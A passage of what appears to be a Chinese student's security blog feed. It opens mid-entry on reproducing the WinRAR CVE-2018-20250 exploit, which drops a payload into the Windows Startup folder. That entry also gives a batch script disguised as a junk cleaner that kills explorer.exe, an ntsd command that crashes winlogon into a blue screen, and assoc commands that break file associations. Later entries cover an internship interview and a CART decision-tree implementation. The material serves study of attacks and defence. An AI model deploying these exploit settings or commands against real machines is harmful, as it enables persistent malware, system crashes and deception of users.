title="UNACEV2.dll"><p>下载CVE-2018-20250漏洞利用工具。解压出来如下：</p><ul><li><code>README.md</code>是漏洞利用说明书，告诉我们哪些参数可以修改、如何运行exp以及漏洞被利用的后果</li><li><code>hello.txt</code>和<code>world.txt</code>是需要压缩的文件</li><li><code>calc.exe</code>是计算器，可以替换成恶意软件，它会被定向植入系统自启动目录</li><li><code>exp.py</code>是运行的Python代码，它会将<code>hello.txt</code>和<code>world.txt</code>压缩，并隐藏恶意软件</li><li><code>acefile.py</code>是利用<code>UNACEV2.dll</code>漏洞的代码，共4000多行</li></ul><img src="/posts/82a69c8b/2.2.1.png" class="" title="漏洞利用工具"><h4 id="2-2-3-3-复现过程"><a href="#2-2-3-3-复现过程" class="headerlink" title="2.2.3.3 复现过程"></a>2.2.3.3 复现过程</h4><p>如果想要修改恶意文件、压缩文件名称、放在启动目录的文件名称等等，可以通过编辑<code>exp.py</code>实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment"># The archive filename you want</span></span><br><span class="line">rar_filename = <span class="string">&quot;test.rar&quot;</span></span><br><span class="line"><span class="comment"># The evil file you want to run</span></span><br><span class="line">evil_filename = <span class="string">&quot;calc.exe&quot;</span></span><br><span class="line"><span class="comment"># The decompression path you want, such shown below</span></span><br><span class="line">target_filename = <span class="string">r&quot;C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe&quot;</span></span><br><span class="line"><span class="comment"># Other files to be displayed when the victim opens the winrar</span></span><br><span class="line"><span class="comment"># filename_list=[]</span></span><br><span class="line">filename_list = [<span class="string">&quot;hello.txt&quot;</span>, <span class="string">&quot;world.txt&quot;</span>]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>运行<code>exp.py</code>，将生成的<code>test.rar</code>发送到靶机中。</p><img src="/posts/82a69c8b/2.2.2.png" class="" title="test.rar"><p>笑死，被发现了。为了实验，将它从隔离区拿出来。</p><img src="/posts/82a69c8b/2.2.3.png" class="" title="安全威胁提示"><p>查看压缩包发现里面不仅有<code>hello.txt</code>和<code>world.txt</code>，还有一个本地磁盘路径，点进去发现就是在自启动目录下放置的<code>hi.exe</code>。(这真的太明显了吧！！)</p><img src="/posts/82a69c8b/2.2.4.png" class="" title="查看压缩包"><p>注意：当用户解压文件时，其解压目录必须是<code>C:\Users\当前用户</code>目录下。</p><p>当用户解压完后，会在自启动目录生成一个<code>hi.exe</code>，也就是<code>calc.exe</code>。在系统重启后会自动打开<code>calc.exe</code>。</p><img src="/posts/82a69c8b/2.2.5.png" class="" title="自启动目录"><h2 id="2-3-恶意自启动防御"><a href="#2-3-恶意自启动防御" class="headerlink" title="2.3 恶意自启动防御"></a>2.3 恶意自启动防御</h2><p>自启动防御可以看<a href="https://v5le0n9.github.io/posts/a48809a5.html#3-2-检查启动项">熊猫烧香病毒的行为机理分析 3.2 检查启动项</a>，在WinRAR恶意劫持自启动漏洞中，可通过删除自启动目录下的恶意软件实现防御。</p><h1 id="3-进程关闭脚本"><a href="#3-进程关闭脚本" class="headerlink" title="3. 进程关闭脚本"></a>3. 进程关闭脚本</h1><p>继续编写一个伪装成“系统垃圾清理”的程序，它其实是一个进程关闭程序，试着关闭桌面进程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line">echo =====若有杀毒软件恶意拦截，请选择【允许程序的所有操作】====</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo =====垃圾清理中，请不要关闭窗口=========</span><br><span class="line">echo.</span><br><span class="line">ping -n 5 127.0.0.1&gt;nul</span><br><span class="line">taskkill /im explorer.exe /f &gt;nul</span><br><span class="line">echo.</span><br><span class="line">echo =====拐了，你的系统已经废了=======</span><br><span class="line">echo.</span><br><span class="line">ping -n 5 127.0.0.1&gt;nul</span><br><span class="line">echo.</span><br><span class="line">start c:\windows\explorer.exe</span><br><span class="line">echo.</span><br><span class="line">echo =====已经修复好！是不是吓坏了！！O(∩_∩)O==========</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>运行该批处理程序，桌面会消失，过一会儿桌面又会恢复。</p><h1 id="4-蓝屏攻击机理"><a href="#4-蓝屏攻击机理" class="headerlink" title="4. 蓝屏攻击机理"></a>4. 蓝屏攻击机理</h1><p>蓝屏死机称为BSOD(Blue Screen of Death)，也是常见的攻击行为，尤其是某些CVE漏洞复现过程，在进行提权尝试前都会先实现蓝屏攻击功能，危害极大。</p><h2 id="4-1-批处理脚本实现蓝屏攻击"><a href="#4-1-批处理脚本实现蓝屏攻击" class="headerlink" title="4.1 批处理脚本实现蓝屏攻击"></a>4.1 批处理脚本实现蓝屏攻击</h2><p>实现蓝屏的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.exe</span><br></pre></td></tr></table></figure><p>ntsd是一个用户态进程调试工具，从Windows 2000就开始被附随在System32目录下。它能够结束除<code>System</code>、<code>smss.exe</code>、<code>csrss.exe</code>、<code>lsass.exe</code>及各种<code>rootkit</code>程序外所有的程序。但在Windows Vista(06年发布)及以上版本的Windows中不含ntsd，必须手动下载至电脑中才可使用。</p><p>为了方便，直接使用Windows 2003实验。制作成批处理脚本或直接在CMD窗口输入命令，主机直接蓝屏并重启。(重启太快了没有蓝屏截图)</p><p>Windows Logon Process(即<code>winlogon.exe</code>)，是Windows NT 用户登录程序，用于管理用户登录和退出。该进程的正常路径应是<code>C:\Windows\System32</code>，且是以 SYSTEM 用户运行。</p><h2 id="4-2-ntsd命令常用参数"><a href="#4-2-ntsd命令常用参数" class="headerlink" title="4.2 ntsd命令常用参数"></a>4.2 ntsd命令常用参数</h2><img src="/posts/82a69c8b/4.2.1.png" class="" title="ntsd常用参数"><p>-c “<command>“表示c参数后面紧接命令，如上面的“q”应该是退出命令。</p><h2 id="4-3-结束进程的几种方法"><a href="#4-3-结束进程的几种方法" class="headerlink" title="4.3 结束进程的几种方法"></a>4.3 结束进程的几种方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//利用进程的PID结束进程</span><br><span class="line">ntsd -c q -p PID</span><br><span class="line"></span><br><span class="line">//利用进程名结束进程</span><br><span class="line">ntsd -c q -pn xxxx.exe</span><br><span class="line"></span><br><span class="line">//利用taskkill命令强制终止进程</span><br><span class="line">taskkill /f /im PID</span><br><span class="line">taskkill /f /im xxxx.exe </span><br><span class="line"></span><br><span class="line">//利用tskill命令结束进程</span><br><span class="line">tskill PID</span><br><span class="line">//xxxx不能带有后缀名</span><br><span class="line">tskill xxxx</span><br></pre></td></tr></table></figure><h1 id="5-简单的扩展名修改恶意攻击"><a href="#5-简单的扩展名修改恶意攻击" class="headerlink" title="5. 简单的扩展名修改恶意攻击"></a>5. 简单的扩展名修改恶意攻击</h1><p>将文件格式修改或文档加密都是常见的病毒，比如永恒之蓝、勒索病毒等，它们就是将电脑内的所有资料、文档加密。当用户打开文件时需要密码，此时通过比特币付费进行勒索。</p><p>编写批处理脚本，当遇到可执行的EXE文件认为它是一个TXT文档，系统默认用记事本打开导致可执行文件运行不起来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assoc.exe=txtfile</span><br></pre></td></tr></table></figure><p>“以管理员身份运行”，EXE文件被当作TXT文件打开。</p><img src="/posts/82a69c8b/5.1.1.png" class=""><p>其它格式文件转换为TXT文件如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assoc .htm=txtfile</span><br><span class="line">assoc .dat=txtfile</span><br><span class="line">assoc .com=txtfile</span><br><span class="line">assoc .rar=txtfile</span><br><span class="line">assoc .gho=txtfile</span><br><span class="line">assoc .mvb=txtfile</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此时，如果用户隐藏文件扩展名，甚至可以修改图标伪装成目标应用，当用户点击时会执行这些破坏。但由于不知道目标是否有隐藏扩展名，还是不建议这种“笨”方法。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;.bat&lt;/code&gt;文件是DOS下的批处理文件。批处理文件是无格式的文本文件，它包含一条或多条命令。它的文件扩展名为&lt;code&gt;.bat&lt;/code&gt;或&lt;code&gt;.cmd&lt;/code&gt;。在命令提示下输入批处理文件的名称，或者双击该批处理文件，系统就会调用&lt;code&gt;cmd.exe&lt;/code&gt;按照该文件中各个命令出现的顺序依次运行它们。使用批处理文件或脚本，可以简化日常或重复性任务。攻击者通常通过批处理文件的编写来实现多工具的组合入侵、自动入侵及结果提取等功能。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>工信部电子五所暑期实习二进制安全研究一面</title>
    <link href="http://example.com/posts/abe2eb06.html"/>
    <id>http://example.com/posts/abe2eb06.html</id>
    <published>2022-06-25T12:23:44.518Z</published>
    <updated>2022-06-25T13:22:18.202Z</updated>
    
    <content type="html"><![CDATA[<p>有了第一次面试的经验，起码有些问题回答得上来了，但面试官说我目前学的还比较基础，我会继续努力的！</p><p>6.13投的简历，6.17面试，现在6.25了为什么还没有消息救命！！</p><span id="more"></span><p>1.首先做一个简单的自我介绍，把你的兴趣、基础等做一个说明和介绍。</p><p>2.为什么会选Windows逆向，因为很多做逆向入门的人都是从Linux逆向开始学习的，你为什么会选Windows逆向来入门？</p><p>3.你觉得你的哪个实践经历或病毒样本最能体现你的研究成果，让你最有成就感的？</p><p>4.你对熊猫样本病毒研究到哪一步？如果你给我们介绍的话你能介绍什么东西？</p><p>5.你对Windows操作系统了解多少？比如说病毒要得到一个远控的话，要启动一个shell，Windows的shellcode和Linux的shellcode是不一样的，这与操作系统相关，Linux操作系统与Windows操作系统的系统调用、堆栈方式、API都不太一样，这方面你了解多少？</p><p>6.假如让你写一个病毒，你觉得你现在还缺什么？</p><p>7.那你分析熊猫样本病毒，你觉得哪一部分是最难的？</p><p>8.你为什么选择二进制方向？</p><p>9.你们这边能实习多长时间？</p><p>10.你工作有什么要求吗，比如说我们公司安排你实习你会考虑留下来吗？</p><p>11.你对Windows二进制安全方面的研究你有什么计划和想法？</p><p><strong>反问环节</strong></p><p>1.您对我这次面试的印象怎样？会不会达不到你们的要求？</p><p>答：我们这边做Windows逆向的比较少，所以我们想多招一些这个方向的人过来。你这边目前还是比较基础的，可能后面还需要更多的学习和积累。</p><p>2.如果我面试通过了会有岗前培训吗？</p><p>答：有培训，但培训更多的是做Linux平台的漏洞挖掘和漏洞利用，其次还有嵌入式、物联网的操作系统，Windows上的比较少。我们应该7月份有一个新入职的，他做Windows逆向应该要比你深入一点，他可以跟你一起。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;有了第一次面试的经验，起码有些问题回答得上来了，但面试官说我目前学的还比较基础，我会继续努力的！&lt;/p&gt;
&lt;p&gt;6.13投的简历，6.17面试，现在6.25了为什么还没有消息救命！！&lt;/p&gt;</summary>
    
    
    
    <category term="往社畜方向前进" scheme="http://example.com/categories/%E5%BE%80%E7%A4%BE%E7%95%9C%E6%96%B9%E5%90%91%E5%89%8D%E8%BF%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>决策树之CART算法</title>
    <link href="http://example.com/posts/8464a317.html"/>
    <id>http://example.com/posts/8464a317.html</id>
    <published>2022-06-05T13:51:36.733Z</published>
    <updated>2022-06-05T14:55:01.147Z</updated>
    
    <content type="html"><![CDATA[<p>CART算法是二叉决策树。本来这个算法难得我想放弃，copy某位博主的代码修改修改就交上去的。结果越改越多，最后除了核心算法没改，整个框架结构都被我改了。被我修改得看起来貌似有点累赘，但好像也是必要的。</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreateData</span>():</span><br><span class="line">    x = np.array([[<span class="string">&#x27;有房&#x27;</span>,<span class="string">&#x27;单身&#x27;</span>,<span class="string">&#x27;125&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;已婚&#x27;</span>,<span class="string">&#x27;100&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;单身&#x27;</span>,<span class="string">&#x27;70&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;有房&#x27;</span>,<span class="string">&#x27;已婚&#x27;</span>,<span class="string">&#x27;120&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;离异&#x27;</span>,<span class="string">&#x27;95&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;已婚&#x27;</span>,<span class="string">&#x27;60&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;有房&#x27;</span>,<span class="string">&#x27;离异&#x27;</span>,<span class="string">&#x27;220&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;单身&#x27;</span>,<span class="string">&#x27;85&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;已婚&#x27;</span>,<span class="string">&#x27;75&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;单身&#x27;</span>,<span class="string">&#x27;90&#x27;</span>]])</span><br><span class="line">    signal = np.array([<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]) <span class="comment">#用0表示特征是离散的，1表示是连续的</span></span><br><span class="line">    y = np.array([<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;是&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;是&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;是&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> x, y, signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DataProcessing</span>(<span class="params">x, signal</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(signal)):</span><br><span class="line">        <span class="keyword">if</span> signal[i] == <span class="number">1</span>:</span><br><span class="line">            tmp = x[:,i]       </span><br><span class="line">            int_list = [<span class="built_in">int</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> tmp]</span><br><span class="line">            sort_lst = <span class="built_in">sorted</span>(int_list)</span><br><span class="line">            split_point = [j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(sort_lst[<span class="number">0</span>],sort_lst[-<span class="number">1</span>],<span class="built_in">int</span>((sort_lst[-<span class="number">1</span>]-sort_lst[<span class="number">0</span>])/<span class="built_in">len</span>(sort_lst)))]</span><br><span class="line">            smin = <span class="number">20000</span> <span class="comment">#初始化方差</span></span><br><span class="line">            jmin = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> split_point:</span><br><span class="line">                x1, x2 = [], []</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(int_list)):</span><br><span class="line">                    <span class="keyword">if</span> k &gt;= int_list[j]:</span><br><span class="line">                        x1.append(int_list[j])</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        x2.append(int_list[j])</span><br><span class="line">                <span class="comment">#print(x1,x2)</span></span><br><span class="line">                r1, r2 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">                avg1 = <span class="built_in">sum</span>(x1) / <span class="built_in">len</span>(x1)</span><br><span class="line">                avg2 = <span class="built_in">sum</span>(x2) / <span class="built_in">len</span>(x2)</span><br><span class="line">                <span class="comment">#print(avg1, avg2)</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> x1:</span><br><span class="line">                    r1 += (j - avg1) ** <span class="number">2</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> x2:</span><br><span class="line">                    r2 += (j - avg2) ** <span class="number">2</span></span><br><span class="line">                <span class="comment">#print(r1+r2)</span></span><br><span class="line">                <span class="keyword">if</span> r1 + r2 &lt; smin:</span><br><span class="line">                    jmin = k</span><br><span class="line">                    smin = r1 + r2</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(int_list)):</span><br><span class="line">                <span class="keyword">if</span> int_list[j] &gt; jmin:</span><br><span class="line">                    x[j][i] = <span class="string">&#x27;高&#x27;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    x[j][i] = <span class="string">&#x27;低&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#基尼指数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Gini</span>(<span class="params">y</span>):</span><br><span class="line">    <span class="comment">#Counter()用来统计不同类别的数量</span></span><br><span class="line">    counter = Counter(y)</span><br><span class="line">    g = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> counter.values():</span><br><span class="line">        p = num / <span class="built_in">len</span>(y)</span><br><span class="line">        g -= p * p</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"><span class="comment">#CART算法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DecisionTree</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.tree = &#123;&#125;</span><br><span class="line">        self.lst = []<span class="comment"># 若有2个以上特征值的特征需记下哪个特征值作为切分点时得出的基尼指数最小</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#训练决策树</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fit</span>(<span class="params">self,x,y</span>):</span><br><span class="line">        cols = <span class="built_in">list</span>(<span class="built_in">range</span>(x.shape[<span class="number">1</span>]))<span class="comment"># [0,1,2]</span></span><br><span class="line">        <span class="comment">#对x的每一列数据，计算基尼指数</span></span><br><span class="line">        self.tree = self._genTree(cols, x, y)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#递归生成决策树</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_genTree</span>(<span class="params">self, cols, x, y</span>):</span><br><span class="line">        <span class="comment"># 计算基尼指数，求得基尼指数最小的特征</span></span><br><span class="line">        imin = cols[<span class="number">0</span>] <span class="comment"># 初始化最小基尼指数的特征</span></span><br><span class="line">        emin = <span class="number">1</span> <span class="comment"># 初始化最小基尼指数为1</span></span><br><span class="line">        e = <span class="number">0.01</span> <span class="comment"># 阈值</span></span><br><span class="line">        st = <span class="string">&#x27;&#x27;</span> <span class="comment"># 若有2个以上特征值的特征需记下哪个特征值作为切分点时得出的基尼指数最小</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> cols:</span><br><span class="line">            coli = x[:,i]<span class="comment">#拿到第i个特征数据</span></span><br><span class="line">            <span class="comment">#在特征为i的情况下，样本集的基尼指数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt; <span class="built_in">len</span>(<span class="built_in">set</span>(coli)) &lt;= <span class="number">2</span>:</span><br><span class="line">                gini = <span class="built_in">sum</span>([<span class="built_in">len</span>(y[coli==d]) / <span class="built_in">len</span>(coli) * Gini(y[coli==d]) <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">set</span>(coli)])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                emin_tmp = <span class="number">1</span></span><br><span class="line">                setlst = <span class="built_in">list</span>(<span class="built_in">set</span>(coli))</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(setlst)):</span><br><span class="line">                    gini = <span class="built_in">len</span>(y[coli==setlst[d]]) / <span class="built_in">len</span>(coli) * Gini(y[coli==setlst[d]])</span><br><span class="line">                    gini += <span class="built_in">len</span>(y[coli!=setlst[d]]) / <span class="built_in">len</span>(coli) * Gini(y[coli!=setlst[d]])      </span><br><span class="line">                    <span class="keyword">if</span> gini &lt;= emin_tmp:</span><br><span class="line">                        st = setlst[d]</span><br><span class="line">                        emin_tmp = gini      </span><br><span class="line">                gini = emin_tmp</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> gini &lt;= emin:</span><br><span class="line">                imin = i</span><br><span class="line">                emin = gini</span><br><span class="line">        self.lst.append(st)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#根据最优特征和最优切分点，生成两个子节点   </span></span><br><span class="line">        newtree=&#123;&#125;</span><br><span class="line">        mincol = x[:,imin]</span><br><span class="line">        cols.remove(imin)</span><br><span class="line">        <span class="comment">#针对这个特征的每个特征值，进一步划分树</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt; <span class="built_in">len</span>(<span class="built_in">set</span>(mincol)) &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">set</span>(mincol):</span><br><span class="line">                gini = Gini(y[mincol==d])  <span class="comment"># 计算基尼指数</span></span><br><span class="line">                <span class="keyword">if</span> gini &lt; e <span class="keyword">or</span> <span class="built_in">len</span>(cols) == <span class="number">0</span>:<span class="comment">#已经完全分开或已无特征</span></span><br><span class="line">                    y_label = Counter(y[mincol==d])</span><br><span class="line">                    y_num = <span class="built_in">max</span>(y_label.values())</span><br><span class="line">                    <span class="keyword">for</span> key,values <span class="keyword">in</span> y_label.items():</span><br><span class="line">                        <span class="keyword">if</span> values == y_num:</span><br><span class="line">                            newtree[d] = key</span><br><span class="line">                <span class="keyword">else</span>:<span class="comment">#还需要进一步细分</span></span><br><span class="line">                    newtree[d] = self._genTree(cols.copy(), x[mincol==d, :], y[mincol==d])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gini = Gini(y[mincol==st])</span><br><span class="line">            <span class="keyword">if</span> gini &lt; e <span class="keyword">or</span> <span class="built_in">len</span>(cols) == <span class="number">0</span>:<span class="comment">#已经完全分开或已无特征</span></span><br><span class="line">                y_label = Counter(y[mincol==st])</span><br><span class="line">                y_num = <span class="built_in">max</span>(y_label.values())</span><br><span class="line">                <span class="keyword">for</span> key,values <span class="keyword">in</span> y_label.items():</span><br><span class="line">                    <span class="keyword">if</span> values == y_num:</span><br><span class="line">                        newtree[st] = key</span><br><span class="line">            <span class="keyword">else</span>:<span class="comment">#还需要进一步细分</span></span><br><span class="line">                newtree[st] = self._genTree(cols.copy(), x[mincol==st, :], y[mincol==st])</span><br><span class="line"></span><br><span class="line">            gini = Gini(y[mincol!=st])</span><br><span class="line">            <span class="keyword">if</span> gini &lt; e <span class="keyword">or</span> <span class="built_in">len</span>(cols) == <span class="number">0</span>:<span class="comment">#已经完全分开或已无特征</span></span><br><span class="line">                y_label = Counter(y[mincol!=st])</span><br><span class="line">                y_num = <span class="built_in">max</span>(y_label.values())</span><br><span class="line">                <span class="keyword">for</span> key,values <span class="keyword">in</span> y_label.items():</span><br><span class="line">                    <span class="keyword">if</span> values == y_num:</span><br><span class="line">                        newtree[<span class="string">&#x27;非&#x27;</span>+st] = key</span><br><span class="line">            <span class="keyword">else</span>:<span class="comment">#还需要进一步细分</span></span><br><span class="line">                newtree[<span class="string">&#x27;非&#x27;</span>+st] = self._genTree(cols.copy(), x[mincol!=st, :], y[mincol!=st])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> &#123;imin: newtree&#125;<span class="comment">#将列号作为索引，返回新生成的树</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#预测新样本</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = x.tolist()</span><br><span class="line">        y = [<span class="literal">None</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            predictDict = 